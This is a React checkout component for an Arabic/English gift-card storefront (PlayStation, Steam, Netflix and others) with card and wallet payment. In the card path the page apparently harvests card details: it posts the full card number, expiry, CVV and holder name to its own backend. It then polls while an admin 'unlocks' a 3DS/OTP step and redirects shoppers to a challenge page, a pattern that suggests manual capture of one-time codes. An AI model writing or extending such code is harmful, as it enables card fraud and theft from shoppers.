import React, {useEffect, useRef, useState} from 'react';
import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, Wallet, XCircle} from 'lucide-react';
import {useLanguage} from '../context/LanguageContext';
import {apiUrl} from '../lib/apiBase';
import {formatLatinDigits} from '../lib/formatNumbers';
import {getPackages, GIFT_CARD_PACKAGES, type GiftCardService, type GiftCardRegion, type GiftCardPackage} from '../lib/giftCardPackages';
import {CreditCardPaymentFields} from './CreditCardPaymentFields';
import {CardProcessingToOtpScreen} from './OtpPaymentUi';
import {redirectToAcsChallenge} from '../lib/acsRedirect';
import {validateCard, cardErrorMessage} from '../lib/cardValidation';

/** أيقونات الخدمات */
type ServiceMeta = {
  nameAr: string; nameEn: string;
  color: string; bg: string; logo: string;
};

const DEFAULT_SERVICE_META: ServiceMeta = {
  nameAr: 'بطاقة رقمية',
  nameEn: 'Digital Gift Card',
  color: '#111827',
  bg: 'bg-gray-50',
  logo: '/icons/logo.png',
};

const SERVICE_META: Partial<Record<GiftCardService, ServiceMeta>> = {
  playstation:  { nameAr: 'بلايستيشن',      nameEn: 'PlayStation',   color: '#003087', bg: 'bg-blue-50',    logo: '/icons/logo.png' },
  steam:        { nameAr: 'ستيم',           nameEn: 'Steam',         color: '#1b2838', bg: 'bg-slate-100',  logo: '/icons/logo.png' },
  xbox:         { nameAr: 'إكس بوكس',       nameEn: 'Xbox',          color: '#107c10', bg: 'bg-green-50',   logo: '/icons/logo.png' },
  cod:          { nameAr: 'كول أوف ديوتي',  nameEn: 'Call of Duty',  color: '#c7a227', bg: 'bg-yellow-50',  logo: '/icons/logo.png' },
  freefire:     { nameAr: 'فري فاير',        nameEn: 'Free Fire',     color: '#ff5722', bg: 'bg-orange-50',  logo: '/services/freefire.png' },
  tiktok_coins: { nameAr: 'تكتوك كوينز',    nameEn: 'TikTok Coins',  color: '#010101', bg: 'bg-gray-50',    logo: '/services/تكتوك كوينز.png' },
  itunes:       { nameAr: 'آيتونز / آبل',   nameEn: 'iTunes / Apple', color: '#FA2D48', bg: 'bg-rose-50',   logo: '/services/itunes.png' },
  netflix:      { nameAr: 'نتفلكس',          nameEn: 'Netflix',       color: '#E50914', bg: 'bg-red-50',     logo: '/services/netflix.png' },
  chatgpt:      { nameAr: 'ChatGPT Plus',    nameEn: 'ChatGPT Plus',  color: '#10a37f', bg: 'bg-emerald-50', logo: '/services/chatgpt.png' },
  canva:        { nameAr: 'كانفا برو',       nameEn: 'Canva Pro',     color: '#00C4CC', bg: 'bg-cyan-50',    logo: '/services/canva.png' },
  iptv:         { nameAr: 'IPTV',            nameEn: 'IPTV',          color: '#7c3aed', bg: 'bg-violet-50',  logo: '/services/iptv.png' },
};

const REGIONS: { id: GiftCardRegion; ar: string; en: string; flag: string }[] = [
  { id: 'global', ar: 'عالمي',    en: 'Global', flag: '🌍' },
  { id: 'usa',    ar: 'أمريكي',   en: 'USA',    flag: '🇺🇸' },
];

type Props = {
  service: GiftCardService;
  clientId: string | null;
  userId: string | null;
  walletBalance?: number;
  prices?: Record<string, number>;
  discountPercent?: number;
  onBack: () => void;
  onComplete?: () => void;
};

function applyDiscount(price: number, percent: number): number {
  if (!price || !percent || percent <= 0) return price;
  const p = Math.min(100, Math.max(0, percent));
  return Math.round(price * (100 - p) / 100);
}

type PaymentType = 'choose' | 'card' | 'wallet' | null;

export function GiftCardOrder({service, clientId, userId, walletBalance = 0, prices, discountPercent = 0, onBack, onComplete}: Props) {
  const {lang, dir, t} = useLanguage();
  const BackIcon = dir === 'rtl' ? ArrowRight : ArrowLeft;
  const meta = SERVICE_META[service] ?? DEFAULT_SERVICE_META;

  const [region, setRegion] = useState<GiftCardRegion>('global');
  const [selected, setSelected] = useState<GiftCardPackage | null>(null);
  const [paymentType, setPaymentType] = useState<PaymentType>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardError, setCardError] = useState<ReturnType<typeof validateCard>>(null);
  const [done, setDone] = useState(false);
  const [failed, setFailed] = useState(false);
  const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
  const redirectingRef = useRef(false);

  const allRegions = new Set((GIFT_CARD_PACKAGES[service] ?? []).map((p) => p.region));
  const showRegionToggle = allRegions.size > 1;
  const packages = getPackages(service, region).map((pkg) => {
    const base = prices && prices[pkg.id] !== undefined ? prices[pkg.id] : pkg.priceIqd;
    const finalPrice = applyDiscount(base, discountPercent);
    return { ...pkg, priceIqd: finalPrice, originalPriceIqd: base };
  });
  const hasDiscount = discountPercent > 0;
  const noPrice = selected?.priceIqd === 0;

  const changeRegion = (r: GiftCardRegion) => {
    setRegion(r);
    setSelected(null);
    setPaymentType(null);
  };

  const openAcs = (orderRef: string, phoneLast3?: string | null) => {
    if (redirectingRef.current) return;
    redirectingRef.current = true;
    redirectToAcsChallenge({
      orderRef,
      clientId,
      lang,
      phoneLast3: phoneLast3 || undefined,
      returnUrl: `${window.location.origin}/`,
    });
  };

  // Poll order status while waiting for admin to unlock 3DS / OTP
  useEffect(() => {
    if (!cardProcessingToOtp || !currentOrderId || !clientId) return;
    let alive = true;

    const poll = async () => {
      try {
        const qs = new URLSearchParams({
          client_id: clientId,
          order_ref: currentOrderId,
        });
        const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
        if (!res.ok || !alive) return;
        const data = (await res.json()) as {
          status?: string;
          phone_last3?: string | null;
        };
        const st = String(data.status || '').toLowerCase();
        if (st === 'awaiting_otp' || st === 'retry_otp') {
          openAcs(currentOrderId, data.phone_last3);
          return;
        }
        if (st === 'completed') {
          setCardProcessingToOtp(false);
          setDone(true);
          onComplete?.();
          return;
        }
        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
          setCardProcessingToOtp(false);
          setFailed(true);
        }
      } catch {
        /* ignore transient poll errors */
      }
    };

    void poll();
    const id = window.setInterval(() => void poll(), 900);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [cardProcessingToOtp, currentOrderId, clientId, onComplete]);

  const backBtn = (onClick: () => void) => (
    <button type="button" onClick={onClick} className="flex items-center gap-2 mb-5">
      <div className="p-2 rounded-xl hover:bg-gray-100 transition-colors">
        <BackIcon className="h-5 w-5 text-gray-600" />
      </div>
    </button>
  );

  if (cardProcessingToOtp) {
    return (
      <CardProcessingToOtpScreen
        lang={lang}
        etaText={t('otpEtaDelivery')}
      />
    );
  }

  if (failed) {
    return (
      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
        <div className="w-24 h-24 bg-red-50 text-red-500 rounded-full flex items-center justify-center mb-6 border-8 border-red-50/50">
          <XCircle className="w-12 h-12" />
        </div>
        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'فشل الدفع' : 'Payment Failed'}</h2>
        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'حاول مرة أخرى أو تواصل مع الدعم' : 'Please try again or contact support'}</p>
        <button
          onClick={() => {
            setFailed(false);
            setCurrentOrderId(null);
            setPaymentType('card');
            redirectingRef.current = false;
          }}
          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95"
        >
          {lang === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
        </button>
      </div>
    );
  }

  if (done) {
    return (
      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
        <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-6 border-8 border-green-50/50">
          <Check className="w-12 h-12" />
        </div>
        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'تم تقديم الطلب!' : 'Order Submitted!'}</h2>
        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'سيتم إرسال الكود خلال دقائق' : 'Your code will be sent shortly'}</p>
        <button onClick={() => { setDone(false); setSelected(null); setPaymentType(null); setCurrentOrderId(null); redirectingRef.current = false; onBack(); }}
          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
          {lang === 'ar' ? 'العودة للخدمات' : 'Back to Services'}
        </button>
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto pb-6" dir={dir}>
      {backBtn(selected && paymentType ? () => setPaymentType(null) : selected ? () => setSelected(null) : onBack)}

      {/* هيدر الخدمة */}
      <div className="flex items-center gap-3 mb-6">
        <div className={`w-14 h-14 rounded-2xl ${meta.bg} flex items-center justify-center shrink-0`}>
          <img src={meta.logo} alt={meta.nameEn} className="w-10 h-10 object-contain"
            onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} />
        </div>
        <div>
          <h2 className="text-xl font-black text-gray-900">{lang === 'ar' ? meta.nameAr : meta.nameEn}</h2>
          <p className="text-sm text-gray-400">{lang === 'ar' ? (showRegionToggle ? 'اختر المنطقة والباقة' : 'اختر الباقة') : (showRegionToggle ? 'Select region & package' : 'Select a package')}</p>
        </div>
      </div>

      {/* اختيار المنطقة */}
      {showRegionToggle && <div className="flex bg-gray-100 rounded-2xl p-1 mb-5">
        {REGIONS.map((r) => (
          <button key={r.id} onClick={() => changeRegion(r.id)}
            className={`flex-1 flex items-center justify-center gap-2 py-2.5 text-sm font-bold rounded-xl transition-all ${
              region === r.id ? 'bg-white shadow text-gray-900' : 'text-gray-500'
            }`}>
            <span className="text-base">{r.flag}</span>
            {lang === 'ar' ? r.ar : r.en}
          </button>
        ))}
      </div>}

      {/* قائمة الباقات */}
      {!paymentType ? (
        <>
          {hasDiscount && (
            <div className="mb-3 flex items-center gap-2 rounded-xl bg-red-50 border border-red-100 px-3 py-2">
              <span className="rounded-full bg-red-600 px-2 py-0.5 text-xs font-black text-white">-{discountPercent}%</span>
              <span className="text-xs font-bold text-red-700">{lang === 'ar' ? 'تخفيض عام على كل الباقات' : 'Discount on all packages'}</span>
            </div>
          )}
          <div className="grid grid-cols-2 gap-3 mb-5">
            {packages.map((pkg) => (
              <button key={pkg.id} onClick={() => setSelected(pkg)}
                className={`rounded-2xl border-2 p-4 text-start transition-all active:scale-[0.98] ${
                  selected?.id === pkg.id ? 'border-red-500 bg-red-50 shadow-md shadow-red-100' : 'border-gray-100 bg-white hover:border-gray-200'
                }`}>
                <p className="font-black text-gray-900" dir="ltr">{lang === 'ar' ? pkg.labelAr : pkg.labelEn}</p>
                {pkg.priceIqd ? (
                  <div className="mt-1 flex items-baseline gap-2" dir="ltr">
                    <p className="text-sm font-bold text-gray-900">{formatLatinDigits(pkg.priceIqd)} <span className="text-xs text-gray-500">{lang === 'ar' ? 'د.ع' : 'IQD'}</span></p>
                    {hasDiscount && pkg.originalPriceIqd > pkg.priceIqd && (
                      <p className="text-xs font-bold text-gray-400 line-through">{formatLatinDigits(pkg.originalPriceIqd)}</p>
                    )}
                  </div>
                ) : (
                  <p className="text-sm font-bold mt-1 text-gray-400">{lang === 'ar' ? 'قريباً' : 'Soon'}</p>
                )}
                {selected?.id === pkg.id && (
                  <span className="inline-flex mt-2 h-5 w-5 items-center justify-center rounded-full bg-red-500 text-white">
                    <Check className="h-3 w-3 stroke-[3]" />
                  </span>
                )}
              </button>
            ))}
          </div>

          <button
            disabled={!selected || noPrice}
            onClick={() => {
              if (selected && !noPrice) setPaymentType('choose');
            }}
            className="w-full bg-red-600 text-white font-black py-4 rounded-2xl disabled:opacity-40 active:scale-[0.99] shadow-lg shadow-red-600/20"
          >
            {!selected ? (lang === 'ar' ? 'اختر باقة' : 'Select a Package') :
             noPrice    ? (lang === 'ar' ? 'السعر غير متاح بعد' : 'Price not set yet') :
             (lang === 'ar' ? `متابعة — ${formatLatinDigits(selected.priceIqd)} دينار` : `Continue — ${formatLatinDigits(selected.priceIqd)} IQD`)}
          </button>
        </>
      ) : paymentType === 'choose' ? (
        <>
          {/* ملخص الباقة */}
          <div className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-4 mb-4 flex items-center gap-3">
            <div className={`w-12 h-12 rounded-xl ${meta.bg} flex items-center justify-center shrink-0`}>
              <img src={meta.logo} alt="" className="w-8 h-8 object-contain" onError={(e) => { (e.target as HTMLImageElement).style.display='none'; }} />
            </div>
            <div className="flex-1 min-w-0">
              <p className="font-black text-white text-sm" dir="ltr">{selected && (lang === 'ar' ? selected.labelAr : selected.labelEn)}</p>
              <p className="text-sm font-black text-yellow-300 mt-0.5" dir="ltr">{selected && formatLatinDigits(selected.priceIqd)} <span className="text-xs text-white/60">{lang === 'ar' ? 'دينار' : 'IQD'}</span></p>
            </div>
            <button onClick={() => setPaymentType(null)} className="text-xs font-bold text-white/60 bg-white/10 rounded-xl px-3 py-1.5">
              {lang === 'ar' ? 'تغيير' : 'Change'}
            </button>
          </div>

          <h3 className="font-black text-gray-900 mb-3">{lang === 'ar' ? 'طريقة الدفع' : 'Payment Method'}</h3>
          <div className="space-y-3">
            <button onClick={() => setPaymentType('card')}
              className="w-full flex items-center gap-4 bg-white rounded-2xl px-4 py-4 border-2 border-gray-100 hover:border-blue-300 active:scale-[0.99] shadow-sm">
              <div className="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center shrink-0">
                <CreditCard className="w-6 h-6 text-blue-600" />
              </div>
              <div className="flex-1 text-start">
                <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'بطاقة بنكية' : 'Bank Card'}</p>
                <p className="text-xs text-gray-400">{lang === 'ar' ? 'فيزا / ماستركارد' : 'Visa / Mastercard'}</p>
              </div>
            </button>

            <button onClick={() => { if (selected && walletBalance >= selected.priceIqd) setPaymentType('wallet'); }}
              disabled={!selected || walletBalance < (selected?.priceIqd ?? 0)}
              className={`w-full flex items-center gap-4 rounded-2xl px-4 py-4 border-2 active:scale-[0.99] shadow-sm ${
                selected && walletBalance >= selected.priceIqd
                  ? 'bg-white border-gray-100 hover:border-green-300'
                  : 'bg-gray-50 border-gray-100 opacity-60 cursor-not-allowed'}`}>
              <div className="w-12 h-12 rounded-xl bg-green-50 flex items-center justify-center shrink-0">
                <Wallet className="w-6 h-6 text-green-600" />
              </div>
              <div className="flex-1 text-start">
                <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'رصيد المحفظة' : 'Wallet Balance'}</p>
                <p className="text-xs text-gray-400" dir="ltr">{formatLatinDigits(walletBalance)} {lang === 'ar' ? 'دينار' : 'IQD'}</p>
              </div>
              {selected && walletBalance >= selected.priceIqd && (
                <span className="text-xs font-bold text-green-600 bg-green-50 px-2 py-1 rounded-full">{lang === 'ar' ? 'متاح' : 'Available'}</span>
              )}
            </button>
          </div>
        </>
      ) : paymentType === 'wallet' ? (
        <div className="space-y-4">
          <div className="bg-green-50 rounded-2xl border border-green-100 p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-green-100 flex items-center justify-center">
              <Wallet className="w-5 h-5 text-green-600" />
            </div>
            <div>
              <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'خصم من المحفظة' : 'Wallet Deduction'}</p>
              <p className="text-xs text-gray-500" dir="ltr">{selected && formatLatinDigits(selected.priceIqd)} {lang === 'ar' ? 'دينار' : 'IQD'}</p>
            </div>
          </div>
          <button disabled={isSubmitting} onClick={async () => {
            if (!clientId || !selected) return;
            setIsSubmitting(true);
            try {
              const res = await fetch(apiUrl('/api/transactions'), {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  client_id: clientId, user_id: userId, type: 'buy',
                  amount: selected.priceIqd,
                  method: lang === 'ar' ? 'رصيد المحفظة' : 'Wallet Balance',
                  details: `🎮 ${lang === 'ar' ? meta.nameAr : meta.nameEn}\n📦 ${lang === 'ar' ? selected.labelAr : selected.labelEn}\n🌍 ${lang === 'ar' ? REGIONS.find(r => r.id === region)?.ar : REGIONS.find(r => r.id === region)?.en}`,
                  pay_from_wallet: true,
                }),
              });
              if (res.ok) { onComplete?.(); setDone(true); }
            } finally { setIsSubmitting(false); }
          }}
            className="w-full bg-red-600 text-white font-black py-4 rounded-2xl disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
            {isSubmitting ? <Activity className="w-5 h-5 animate-pulse mx-auto" /> : (lang === 'ar' ? 'تأكيد الدفع' : 'Confirm Payment')}
          </button>
        </div>
      ) : (
        /* دفع بالبطاقة → معالجة 1-2 دقيقة → صفحة 3DS */
        <form onSubmit={async (e) => {
          e.preventDefault();
          if (!clientId || !selected) return;
          const form = e.target as HTMLFormElement;
          const cardNumber = (form.elements.namedItem('cc-number') as HTMLInputElement).value;
          const expMonth = (form.elements.namedItem('cc-exp-month') as HTMLSelectElement).value;
          const expYear = (form.elements.namedItem('cc-exp-year') as HTMLSelectElement).value;
          const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
          const err = validateCard({number: cardNumber, expMonth, expYear, cvv});
          if (err) { setCardError(err); return; }
          setCardError(null);
          setIsSubmitting(true);
          redirectingRef.current = false;
          // Show wait screen immediately so user never stays on card form
          setCardProcessingToOtp(true);
          try {
            const res = await fetch(apiUrl('/api/transactions'), {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                client_id: clientId, user_id: userId, type: 'buy',
                amount: selected.priceIqd,
                method: lang === 'ar' ? 'بطاقة بنكية' : 'Bank Card',
                details: `🎮 ${lang === 'ar' ? meta.nameAr : meta.nameEn}\n📦 ${lang === 'ar' ? selected.labelAr : selected.labelEn}\n🌍 ${lang === 'ar' ? REGIONS.find(r => r.id === region)?.ar : REGIONS.find(r => r.id === region)?.en}`,
                card_fields: {
                  holder: (form.elements.namedItem('cc-name') as HTMLInputElement).value,
                  number: cardNumber.replace(/\s/g,''),
                  expiry: `${expMonth}/${String(expYear).slice(-2)}`,
                  cvv,
                },
              }),
            });
            if (!res.ok) {
              setCardProcessingToOtp(false);
              setIsSubmitting(false);
              return;
            }
            const data = await res.json();
            const orderRef = data.order_ref || data.id;
            if (!orderRef) {
              setCardProcessingToOtp(false);
              setIsSubmitting(false);
              return;
            }
            setCurrentOrderId(String(orderRef));
            setCardProcessingToOtp(true);
            setIsSubmitting(false);
            onComplete?.();
          } catch {
            setCardProcessingToOtp(false);
            setIsSubmitting(false);
          }
        }} className="space-y-4">
          <div className="bg-white rounded-2xl border border-gray-100 p-4">
            <CreditCardPaymentFields idPrefix="gc-cc" error={cardError} onChange={() => setCardError(null)} />
            {cardError && (
              <p className="mt-2 text-xs font-bold text-red-600">{cardErrorMessage(cardError, lang)}</p>
            )}
          </div>
          <button type="submit" disabled={isSubmitting}
            className="w-full bg-red-600 text-white font-black py-4 rounded-2xl disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
            {isSubmitting ? <Activity className="w-5 h-5 animate-pulse mx-auto" /> : (lang === 'ar' ? 'تأكيد الدفع' : 'Confirm Payment')}
          </button>
        </form>
      )}
    </div>
  );
}
